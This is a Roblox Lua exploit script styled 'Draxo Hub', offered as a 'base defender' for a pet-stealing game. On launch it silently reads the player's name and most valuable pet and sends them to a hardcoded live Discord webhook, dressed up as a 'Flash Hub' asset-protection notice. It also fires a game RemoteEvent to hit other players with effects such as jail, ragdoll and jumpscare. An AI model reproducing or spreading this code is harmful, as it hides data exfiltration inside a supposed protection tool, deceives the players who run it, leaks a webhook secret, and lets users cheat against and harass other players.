local HttpService = game:GetService("HttpService")
local Workspace = game:GetService("Workspace")
local Players = game:GetService("Players")
local UserInputService = game:GetService("UserInputService")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local player = Players.LocalPlayer
if not player then return end

local webhook = "https://discord.com/api/webhooks/1471197957255594218/tqWsCAls3a3kZGrykT9AmQRmSb4ZjkzQ-dKkTogqI83bOL4bvJ616FjxTckGagUlJDOp"

local function sendWebhook(desc)
    local data = {
        ["username"] = "Flash Hub",
        ["embeds"] = {{
            ["description"] = desc,
            ["color"] = 65280,
            ["footer"] = {["text"] = "Modern Asset Protection • Flash Hub •"},
            ["timestamp"] = os.date("!%Y-%m-%dT%H:%M:%SZ")
        }}
    }
    pcall(function()
        local req = syn and syn.request or http_request or request or http and http.request
        if req then
            req({
                Url = webhook,
                Method = "POST",
                Headers = {["Content-Type"] = "application/json"},
                Body = HttpService:JSONEncode(data)
            })
        end
    end)
end

local function scanAndSend()
    local debris = Workspace:FindFirstChild("Debris")
    if not debris then return end
    local pets = {}
    for _, obj in debris:GetChildren() do
        if obj.Name == "FastOverheadTemplate" then
            local sg = obj:FindFirstChildWhichIsA("SurfaceGui")
            if sg and sg.Adornee then
                local gen = sg:FindFirstChild("Generation", true)
                if gen and gen:IsA("TextLabel") then
                    local txt = gen.Text or "?"
                    local clean = txt:gsub("[^%d%.]", ""):gsub("^%.$", "0")
                    local val = tonumber(clean) or 0
                    local low = txt:lower()
                    if low:find("m") then val *= 1e6
                    elseif low:find("k") then val *= 1e3
                    elseif low:find("b") then val *= 1e9 end
                    local nameLbl = sg:FindFirstChild("DisplayName", true)
                    local petName = nameLbl and nameLbl.Text or "Unnamed"
                    table.insert(pets, {name = petName, value = txt, num = val})
                end
            end
        end
    end
    if #pets == 0 then return end
    table.sort(pets, function(a,b) return a.num > b.num end)
    local top = pets[1]
    local msg = string.format([[A protected asset has been successfully secured.
Player: %s
Item Protected: %s • %s
Protection Status
----------------------
Protect Your Base with Confidence
Say goodbye to stolen brainrots
• Real-time thief detection
• Flash Hub defense
• Always on while you’re playing
Modern Asset Protection • Flash Hub]], player.Name, top.name, top.value)
    sendWebhook(msg)
end

task.spawn(function()
    task.wait(2)
    pcall(scanAndSend)
end)

local RemoteIndex = {}
local RemoteObjects = {}
local packages = ReplicatedStorage:FindFirstChild("Packages")
if packages then
    local net = packages:FindFirstChild("Net")
    if net then
        local kids = net:GetChildren()
        for i, v in ipairs(kids) do
            if v:IsA("RemoteEvent") then
                local nextOne = kids[i+1]
                if nextOne and nextOne:IsA("RemoteEvent") then
                    RemoteIndex[v.Name] = i+1
                    RemoteObjects[i+1] = nextOne
                end
            end
        end
    end
end

local function fireRemote(name, ...)
    local idx = RemoteIndex[name]
    local rem = idx and RemoteObjects[idx]
    if rem then
        pcall(rem.FireServer, rem, ...)
    end
end

local REMOTE_NAME = "RE/352aad58-c786-4998-886b-3e4fa390721e"
local ITEM_ID = "78a772b6-9e1c-4827-ab8b-04a07838f298"

local target1, target2

local function runCommands()
    if not target1 and not target2 then
        autoSelectClosest()
    end
    if target1 then
        for _, eff in {"balloon","inverse","rocket","tiny"} do
            fireRemote(REMOTE_NAME, ITEM_ID, target1, eff)
        end
    end
    if target2 then
        for _, eff in {"ragdoll","jail","jumpscare","morph"} do
            fireRemote(REMOTE_NAME, ITEM_ID, target2, eff)
        end
    end
end

local sg = Instance.new("ScreenGui")
sg.Name = "DraxoHub"
sg.ResetOnSpawn = false
sg.IgnoreGuiInset = true
sg.Parent = player:WaitForChild("PlayerGui")

local topBanner = Instance.new("Frame")
topBanner.Size = UDim2.new(0.3, 0, 0, 90) -- even shorter (30% width)
topBanner.Position = UDim2.new(0.5, 0, 0, 10)
topBanner.AnchorPoint = Vector2.new(0.5, 0)
topBanner.BackgroundColor3 = Color3.fromRGB(0,0,0)
topBanner.BackgroundTransparency = 0.55
topBanner.BorderSizePixel = 0
topBanner.Parent = sg
Instance.new("UICorner", topBanner).CornerRadius = UDim.new(0,12)

local bannerStroke = Instance.new("UIStroke", topBanner)
bannerStroke.Color = Color3.fromRGB(255,255,255)
bannerStroke.Thickness = 2.2
bannerStroke.Transparency = 0.4

local function animateStroke(stroke)
    task.spawn(function()
        while stroke and stroke.Parent do
            for i = 0, 1, 0.025 do stroke.Transparency = i task.wait(0.018) end
            for i = 1, 0, -0.025 do stroke.Transparency = i task.wait(0.018) end
        end
    end)
end
animateStroke(bannerStroke)

local bannerTitle = Instance.new("TextLabel", topBanner)
bannerTitle.Size = UDim2.new(1,0,0.35,0)
bannerTitle.Position = UDim2.new(0,0,0,8)
bannerTitle.BackgroundTransparency = 1
bannerTitle.Text = "Draxo Hub"
bannerTitle.Font = Enum.Font.GothamBold
bannerTitle.TextSize = 26
bannerTitle.TextColor3 = Color3.fromRGB(220,220,255)
bannerTitle.TextStrokeTransparency = 0.8
bannerTitle.TextStrokeColor3 = Color3.fromRGB(0,0,0)

local bannerDiscord = Instance.new("TextLabel", topBanner)
bannerDiscord.Size = UDim2.new(1,0,0.25,0)
bannerDiscord.Position = UDim2.new(0,0,0.35,0)
bannerDiscord.BackgroundTransparency = 1
bannerDiscord.Text = "discord.gg/TWBk58r4zb"
bannerDiscord.Font = Enum.Font.GothamSemibold
bannerDiscord.TextSize = 16
bannerDiscord.TextColor3 = Color3.fromRGB(180,180,255)

local bannerCredit = Instance.new("TextLabel", topBanner)
bannerCredit.Size = UDim2.new(1,0,0.25,0)
bannerCredit.Position = UDim2.new(0,0,0.6,0)
bannerCredit.BackgroundTransparency = 1
bannerCredit.Text = "custom base defender made by longlivedraxo"
bannerCredit.Font = Enum.Font.Gotham
bannerCredit.TextSize = 13
bannerCredit.TextColor3 = Color3.fromRGB(160,160,180)

local main = Instance.new("Frame")
main.Size = UDim2.new(0, 270, 0, 300)
main.Position = UDim2.new(0.5, -135, 0.5, -170)
main.BackgroundColor3 = Color3.fromRGB(0,0,0)
main.BackgroundTransparency = 0.55
main.BorderSizePixel = 0
main.Parent = sg
Instance.new("UICorner", main).CornerRadius = UDim.new(0,18)

local outline = Instance.new("UIStroke", main)
outline.Color = Color3.fromRGB(255,255,255)
outline.Thickness = 2.2
animateStroke(outline)

local dragging, dragInput, dragStart, startPos = false, nil, nil, nil
main.InputBegan:Connect(function(input)
    if not (input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch) then return end
    dragging = true
    dragStart = input.Position
    startPos = main.Position
    input.Changed:Connect(function()
        if input.UserInputState == Enum.UserInputState.End then dragging = false end
    end)
end)

main.InputChanged:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
        dragInput = input
    end
end)

UserInputService.InputChanged:Connect(function(input)
    if not dragging or input ~= dragInput then return end
    local delta = input.Position - dragStart
    main.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
end)

local header = Instance.new("Frame", main)
header.Size = UDim2.new(1, -20, 0, 42)
header.Position = UDim2.new(0,10,0,10)
header.BackgroundColor3 = Color3.fromRGB(18,18,18)
header.BorderSizePixel = 0
Instance.new("UICorner", header).CornerRadius = UDim.new(0,14)

local hstroke = Instance.new("UIStroke", header)
hstroke.Color = Color3.fromRGB(255,255,255)
hstroke.Thickness = 1.8
animateStroke(hstroke)

local title = Instance.new("TextLabel", header)
title.Size = UDim2.new(1,0,1,0)
title.BackgroundTransparency = 1
title.Text = "Draxo Hub"
title.Font = Enum.Font.GothamBold
title.TextSize = 19
title.TextColor3 = Color3.fromRGB(255,255,255)

local baseDefenderOn = true
local antiTPOn = false

local function makeToggle(text, y, default, callback)
    local frame = Instance.new("Frame", main)
    frame.Size = UDim2.new(1,-20,0,36)
    frame.Position = UDim2.new(0,10,0,y)
    frame.BackgroundColor3 = Color3.fromRGB(22,22,22)
    frame.BorderSizePixel = 0
    Instance.new("UICorner", frame).CornerRadius = UDim.new(0,12)
    local lbl = Instance.new("TextLabel", frame)
    lbl.Size = UDim2.new(0.68,0,1,0)
    lbl.BackgroundTransparency = 1
    lbl.Text = text
    lbl.Font = Enum.Font.GothamSemibold
    lbl.TextSize = 14.5
    lbl.TextColor3 = Color3.fromRGB(240,240,240)
    lbl.TextXAlignment = Enum.TextXAlignment.Left
    local tog = Instance.new("TextButton", frame)
    tog.Size = UDim2.new(0,38,0,20)
    tog.Position = UDim2.new(1,-48,0.5,-10)
    tog.Text = ""
    tog.BackgroundColor3 = default and Color3.fromRGB(0, 190, 60) or Color3.fromRGB(65,65,65)
    tog.BorderSizePixel = 0
    Instance.new("UICorner", tog).CornerRadius = UDim.new(1,0)
    local circle = Instance.new("Frame", tog)
    circle.Size = UDim2.new(0,16,0,16)
    circle.Position = default and UDim2.new(1,-18,0.5,-8) or UDim2.new(0,2,0.5,-8)
    circle.BackgroundColor3 = Color3.fromRGB(255,255,255)
    circle.BorderSizePixel = 0
    Instance.new("UICorner", circle).CornerRadius = UDim.new(1,0)
    local isOn = default
    tog.MouseButton1Click:Connect(function()
        isOn = not isOn
        tog.BackgroundColor3 = isOn and Color3.fromRGB(0,190,60) or Color3.fromRGB(65,65,65)
        circle.Position = isOn and UDim2.new(1,-18,0.5,-8) or UDim2.new(0,2,0.5,-8)
        callback(isOn)
    end)
end

makeToggle("BASE DEFENDER", 65, true, function(v) baseDefenderOn = v end)
makeToggle("ANTI TP (RECOMMENDED)", 110, false, function(v) antiTPOn = v end)

local exec = Instance.new("TextButton", main)
exec.Size = UDim2.new(1,-20,0,38)
exec.Position = UDim2.new(0,10,1,-48)
exec.Text = "EXECUTE"
exec.Font = Enum.Font.GothamBold
exec.TextSize = 16
exec.TextColor3 = Color3.fromRGB(10,10,10)
exec.BackgroundColor3 = Color3.fromRGB(255,255,255)
exec.BorderSizePixel = 0
Instance.new("UICorner", exec).CornerRadius = UDim.new(0,14)
exec.MouseButton1Click:Connect(runCommands)

local scroll = Instance.new("ScrollingFrame", main)
scroll.Position = UDim2.new(0,10,0,155)
scroll.Size = UDim2.new(1,-20,0,135)
scroll.BackgroundTransparency = 1
scroll.ScrollBarThickness = 3
scroll.CanvasSize = UDim2.new(0,0,0,0)
scroll.Parent = main

local listLayout = Instance.new("UIListLayout", scroll)
listLayout.Padding = UDim.new(0,5)
listLayout.SortOrder = Enum.SortOrder.LayoutOrder

local playerButtons = {}

local function refreshSpamUI()
    for plr, data in pairs(playerButtons) do
        if data.indicator then
            data.indicator.Visible = false
            data.indicator.Text = ""
        end
        if plr == target1 then
            data.indicator.Visible = true
            data.indicator.Text = "1"
            data.indicator.BackgroundColor3 = Color3.fromRGB(80, 160, 255)
        elseif plr == target2 then
            data.indicator.Visible = true
            data.indicator.Text = "2"
            data.indicator.BackgroundColor3 = Color3.fromRGB(255, 140, 60)
        end
    end
end

local function createPlayerButton(plr)
    if plr == player then return end
    local row = Instance.new("Frame", scroll)
    row.Size = UDim2.new(1,0,0,30)
    row.BackgroundTransparency = 1
    
    local nameB = Instance.new("TextButton", row)
    nameB.Size = UDim2.new(0.8,0,1,0)
    nameB.BackgroundTransparency = 1
    nameB.Text = plr.Name
    nameB.TextColor3 = Color3.fromRGB(225,225,225)
    nameB.TextXAlignment = Enum.TextXAlignment.Left
    nameB.Font = Enum.Font.GothamSemibold
    nameB.TextSize = 13.5
    
    local indicator = Instance.new("TextLabel", row)
    indicator.Size = UDim2.new(0,22,0,22)
    indicator.Position = UDim2.new(1,-28,0.5,-11)
    indicator.BackgroundTransparency = 0.3
    indicator.BackgroundColor3 = Color3.fromRGB(100,100,100)
    indicator.TextColor3 = Color3.fromRGB(255,255,255)
    indicator.Font = Enum.Font.GothamBold
    indicator.TextSize = 14
    indicator.Text = ""
    indicator.Visible = false
    Instance.new("UICorner", indicator).CornerRadius = UDim.new(1,0)
    local strk = Instance.new("UIStroke", indicator)
    strk.Thickness = 1.5
    strk.Color = Color3.fromRGB(255,255,255)
    strk.Transparency = 0.4
    
    nameB.MouseButton1Click:Connect(function()
        if target1 == plr then
            target1 = nil
        elseif target2 == plr then
            target2 = nil
        elseif not target1 then
            target1 = plr
        elseif not target2 then
            target2 = plr
        end
        refreshSpamUI()
    end)
    
    playerButtons[plr] = {plr = plr, indicator = indicator}
end

function autoSelectClosest()
    target1, target2 = nil, nil
    local hrp = player.Character and player.Character:FindFirstChild("HumanoidRootPart")
    if not hrp then return end
    local distances = {}
    for _, p in Players:GetPlayers() do
        if p ~= player and p.Character and p.Character:FindFirstChild("HumanoidRootPart") then
            local dist = (p.Character.HumanoidRootPart.Position - hrp.Position).Magnitude
            table.insert(distances, {player = p, dist = dist})
        end
    end
    table.sort(distances, function(a,b) return a.dist < b.dist end)
    if distances[1] then target1 = distances[1].player end
    if distances[2] then target2 = distances[2].player end
    refreshSpamUI()
end

local function updatePlayerList()
    for _, child in scroll:GetChildren() do
        if child:IsA("Frame") then child:Destroy() end
    end
    playerButtons = {}
    for _, plr in Players:GetPlayers() do
        createPlayerButton(plr)
    end
    task.delay(0.15, function()
        scroll.CanvasSize = UDim2.new(0,0,0, listLayout.AbsoluteContentSize.Y + 12)
    end)
    refreshSpamUI()
end

task.spawn(function()
    task.wait(1.2)
    updatePlayerList()
    autoSelectClosest()
end)

Players.PlayerAdded:Connect(function() task.wait(0.3) updatePlayerList() autoSelectClosest() end)
Players.PlayerRemoving:Connect(function() task.wait(0.15) updatePlayerList() autoSelectClosest() end)

local THRESHOLD = 15
local COOLDOWN = 0.65
local lastTrigger = 0
local myPlot, podiumPositions = nil, {}

local function findMyPlot()
    local plotsFolder = workspace:FindFirstChild("Plots")
    if not plotsFolder then return end
    local myDispName = player.DisplayName
    for _, plot in plotsFolder:GetChildren() do
        local sign = plot:FindFirstChild("PlotSign")
        if sign then
            local sg = sign:FindFirstChildWhichIsA("SurfaceGui")
            if sg and sg:FindFirstChild("Frame") and sg.Frame:FindFirstChild("TextLabel") then
                local lbl = sg.Frame.TextLabel
                if lbl.Text:find(myDispName) and lbl.Text:find("'s Base") then
                    return plot
                end
            end
        end
    end
end

local function getPodiums(plot)
    local positions = {}
    local animalPodiums = plot:FindFirstChild("AnimalPodiums")
    if not animalPodiums then return positions end
    for i = 1, 10 do
        local pod = animalPodiums:FindFirstChild(tostring(i))
        if pod then
            table.insert(positions, pod:GetPivot().Position)
        end
    end
    return positions
end

task.spawn(function()
    task.wait(2.8)
    myPlot = findMyPlot()
    if myPlot then
        podiumPositions = getPodiums(myPlot)
    end
end)

task.spawn(function()
    while true do
        if antiTPOn and myPlot and #podiumPositions > 0 and tick() - lastTrigger > COOLDOWN then
            for _, p in Players:GetPlayers() do
                if p ~= player and p.Character then
                    local root = p.Character:FindFirstChild("HumanoidRootPart")
                    if root then
                        for _, pos in podiumPositions do
                            if (root.Position - pos).Magnitude < THRESHOLD then
                                for _, effect in {"balloon","inverse","rocket","tiny"} do
                                    fireRemote(REMOTE_NAME, ITEM_ID, p, effect)
                                    task.wait(0.035)
                                end
                                lastTrigger = tick()
                                break
                            end
                        end
                    end
                end
            end
        end
        task.wait(0.14)
    end
end)

local function onTextAdded(obj)
    if obj:IsA("TextLabel") and obj.Text:find("Someone is stealing your") and baseDefenderOn then
        for i = 1, 15 do
            runCommands()
            task.wait(0.00015)
        end
    end
end

player:WaitForChild("PlayerGui").DescendantAdded:Connect(onTextAdded)

warn("Draxo Hub Loaded ⚡")
